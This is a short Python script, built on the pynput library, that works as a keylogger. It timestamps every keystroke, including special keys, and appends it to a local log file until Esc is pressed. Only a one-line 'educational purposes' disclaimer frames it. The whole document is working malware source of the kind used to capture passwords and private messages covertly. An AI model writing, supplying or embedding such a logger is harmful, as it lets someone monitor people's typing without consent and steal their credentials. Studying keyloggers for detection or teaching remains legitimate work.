from pynput import keyboard
import datetime

# WARNING: This is for educational purposes only
# Never use this without explicit permission

log_file = "keystrokes.log"

def on_press(key):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - Key pressed: {key.char}\n")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - Special key pressed: {key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()